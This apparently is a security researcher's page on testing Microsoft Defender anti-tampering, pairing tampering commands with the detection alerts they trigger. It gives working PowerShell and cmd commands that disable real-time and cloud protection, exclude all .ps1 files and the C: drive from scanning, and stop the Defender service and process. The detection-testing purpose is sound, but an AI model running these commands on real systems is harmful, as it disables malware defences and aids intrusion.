# AV Tampering 
Microsoft Defender for Endpoint does provide AV tampering protection called **Tamper Protection**, preventing attackers from modifying values and disabling detection engines during defense evasion attempts. If Tamper Protection is enabled, AV tampering activities will be blocked. Even if not enabled, AV tampering activities will be detected by Microsoft Defender for Endpoint.

On this page, I would like to showcase **some test methods** and demonstrate **the detection/alerts** capabilities of Microsoft Defender for Endpoint. 

## TEST insights
**PowerShell, Defender Cmdlet** 
```powershell
# Disable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true
# Disable cloud-delivered protection
Set-MpPreference -MAPSReporting 0
# Modify exclusions - Extensions & Paths 
Set-MpPreference -ExclusionExtension "ps1" -ExclusionPath "C:\"
```

**PowerShell, creating new registry values**
```powershell
# Disable real-time protection
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name DisableRealtimeMonitoring -Value 1 -PropertyType DWord -Force
# Disable cloud-delivered protection
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name SpynetReporting -Value 0 -PropertyType DWord -Force
# Modify exclusions - Extensions & Paths 
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions" -Name "ps1" -Value 0 -PropertyType String -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\" -Value 0 -PropertyType String -Force
```
> [!Important]
> If the specified path doesn't exist, PowerShell returns an error. So, please ensure that the path exists. If it doesn't exist, you can create it.
> e.g. if Exclusions/Extensions path doesn't exist
> ```powershell
> New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions" -Name 'Extensions' -Force -ErrorAction 0
> ```

**PowerShell, stop Defender Service & Process**
```powershell
Stop-Service -Name "WinDefend"
Stop-Process -Name "MsMpEng"
```

**Windows commands, Creating new registry values**
```cmd
rem Disable real-time protection
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
rem Disable cloud-delivered protection
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d 0 /f
rem Modify exclusions - Extensions & Paths 
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions" /v "ps1" /t REG_SZ /d 0 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /f /v "C:\" /t REG_DWORD /d 0 /reg:64
```

**Windows commands, stop Defender Service, Network Service**
```cmd
sc stop WinDefend
net stop WinDefend
```

## Alerts & Detections
Here are alerts detected by Microsoft Defender for Endpoint and Microsoft Defender Antivirus. 
These alerts originated from the aforementioned PowerShell and CMD.

- [x] Suspicious Microsoft Defender Antivirus exclusion
- [x] Attempt to turn off Microsoft Defender Antivirus protection
- [x] An active 'MpTamperSrvDisableAV' malware was prevented from executing via AMSI
- [x] An active 'MpTamperSrvDisableAV' malware in a command line was prevented from executing
- [x] Microsoft Defender Antivirus protection turned off
- [x] Microsoft Defender Antivirus tampering

![image](https://github.com/LearningKijo/ResearchDev/assets/120234772/4cc90ed3-6672-421b-84c0-4b8fb6e6b4f6)

**Detecting potential tampering activity in the Microsoft Defender portal**

When tampering is detected, an alert is raised. Some of the alert titles for tampering are : [Tamper resiliency](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/tamper-resiliency?view=o365-worldwide)
```
- Attempt to bypass Microsoft Defender for Endpoint client protection
- Attempt to stop Microsoft Defender for Endpoint sensor
- Attempt to tamper with Microsoft Defender on multiple devices
- Attempt to turn off Microsoft Defender Antivirus protection
- Defender detection bypass
- Driver-based tampering attempt blocked
- Image file execution options set for tampering purposes
- Microsoft Defender Antivirus protection turned off
- Microsoft Defender Antivirus tampering
- Modification attempt in Microsoft Defender Antivirus exclusion list
- Pending file operations mechanism abused for tampering purposes
- Possible Antimalware Scan Interface (AMSI) tampering
- Possible remote tampering
- Possible sensor tampering in memory
- Potential attempt to tamper with MDE via drivers
- Security software tampering
- Suspicious Microsoft Defender Antivirus exclusion
- Tamper protection bypass
- Tampering activity typical to ransomware attacks
- Tampering with Microsoft Defender for Endpoint sensor communication
- Tampering with Microsoft Defender for Endpoint sensor settings
- Tampering with the Microsoft Defender for Endpoint sensor
```

## Reference
- [Current limits of Defender AV Tamper Protection](https://cloudbrothers.info/current-limits-defender-av-tamper-protection/)
- [Make sure Tamper Protection is turned on](https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/make-sure-tamper-protection-is-turned-on/ba-p/2695568)
- [When coin miners evolve, Part 1: Exposing LemonDuck and LemonCat, modern mining malware infrastructure](https://www.microsoft.com/en-us/security/blog/2021/07/22/when-coin-miners-evolve-part-1-exposing-lemonduck-and-lemoncat-modern-mining-malware-infrastructure/)
- [When coin miners evolve, Part 2: Hunting down LemonDuck and LemonCat attacks](https://www.microsoft.com/en-us/security/blog/2021/07/29/when-coin-miners-evolve-part-2-hunting-down-lemonduck-and-lemoncat-attacks/)


#### Disclaimer
The views and opinions expressed herein are those of the author and do not necessarily reflect the views of company.
